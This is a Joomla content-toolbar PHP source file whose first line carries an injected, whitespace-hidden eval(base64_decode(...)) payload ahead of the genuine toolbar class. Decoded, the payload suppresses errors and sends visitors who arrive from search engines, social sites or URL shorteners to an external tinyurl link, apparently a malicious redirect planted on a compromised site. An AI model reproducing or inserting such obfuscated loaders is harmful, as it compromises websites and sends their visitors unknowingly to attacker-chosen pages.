<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: toolbar.content.html.php 19173 2010-10-21 03:00:28Z ian $
* @package		Joomla
* @subpackage	Content
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
* @package		Joomla
* @subpackage	Content
*/
class TOOLBAR_content
{
	function _EDIT($edit)
	{
		$cid = JRequest::getVar( 'cid', array(0), '', 'array' );
		$cid = intval($cid[0]);

		$text = ( $edit ? JText::_( 'Edit' ) : JText::_( 'New' ) );

		JToolBarHelper::title( JText::_( 'Article' ).': <small><small>[ '. $text.' ]</small></small>', 'addedit.png' );
		JToolBarHelper::preview( 'index.php?option=com_content&id='.$cid.'&tmpl=component', true );
		JToolBarHelper::save();
		JToolBarHelper::apply();
		if ( $edit ) {
			// for existing articles the button is renamed `close`
			JToolBarHelper::cancel( 'cancel', 'Close' );
		} else {
			JToolBarHelper::cancel();
		}
		JToolBarHelper::help( 'screen.content.edit' );
	}
/*
	function _ARCHIVE()
	{
		JToolBarHelper::title( JText::_( 'Archive Manager' ), 'addedit.png' );
		JToolBarHelper::unarchiveList();
		JToolBarHelper::custom( 'remove', 'delete.png', 'delete_f2.png', 'Trash', false );
		JToolBarHelper::help( 'screen.content.archive' );
	}
*/
	function _MOVE()
	{
		JToolBarHelper::title( JText::_( 'Move Articles' ), 'move_f2.png' );
		JToolBarHelper::custom( 'movesectsave', 'save.png', 'save_f2.png', 'Save', false );
		JToolBarHelper::cancel();
	}

	function _COPY()
	{
		JToolBarHelper::title( JText::_( 'Copy Articles' ), 'copy_f2.png' );
		JToolBarHelper::custom( 'copysave', 'save.png', 'save_f2.png', 'Save', false );
		JToolBarHelper::cancel();
	}

	function _DEFAULT()
	{
		global $filter_state;

		JToolBarHelper::title( JText::_( 'Article Manager' ), 'article.png' );
		if ($filter_state == 'A' || $filter_state == NULL) {
			JToolBarHelper::unarchiveList();
		}
		if ($filter_state != 'A') {
			JToolBarHelper::archiveList();
		}
		JToolBarHelper::publishList();
		JToolBarHelper::unpublishList();
		JToolBarHelper::customX( 'movesect', 'move.png', 'move_f2.png', 'Move' );
		JToolBarHelper::customX( 'copy', 'copy.png', 'copy_f2.png', 'Copy' );
		JToolBarHelper::trash();
		JToolBarHelper::editListX();
		JToolBarHelper::addNewX();
		JToolBarHelper::preferences('com_content', '550');
		JToolBarHelper::help( 'screen.content' );
	}
}